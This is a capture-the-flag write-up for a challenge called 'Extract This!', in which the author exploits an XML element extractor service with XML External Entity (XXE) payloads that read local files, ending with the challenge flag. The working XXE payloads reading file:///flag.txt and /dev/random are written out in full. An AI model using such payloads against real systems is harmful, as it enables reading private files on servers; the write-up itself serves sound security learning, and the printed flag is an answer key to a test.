# Writeup - Extract This!
**Author: Chabz**

**Difficulty: challenging**

**Category: pwn**

---

When connecting to the task we are 
presented with this:
```
$ nc extract.tghack.no 6000
Welcome to this absolutely not suspicious XML element extractor!


Please enter your XML here:
```

So it wants some XML to parse. Let's
try some basic stuff:
```
Please enter your XML here:
<tag>data</tag>
data
```

Looks like it just returns whatever is inside the tag.
So how can we exploit this thing? Some googling on
`xml exploits` gives us this [OWASP article](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing).
The first example targeting `/dev/random` seems to have
some effect (it doesn't return anything):
```
Please enter your XML here:
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///dev/random" >]><foo>&xxe;</foo>



^C
```

Let's try to adapt it to our needs. We guess that the
flag is stored in a `flag.txt`:
```
Please enter your XML here:
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///flag.txt"> ]><foo>&xxe;</foo>
TG20{never_trust_the_external_entities}

```

Success! The flag is `TG20{never_trust_the_external_entities}`.
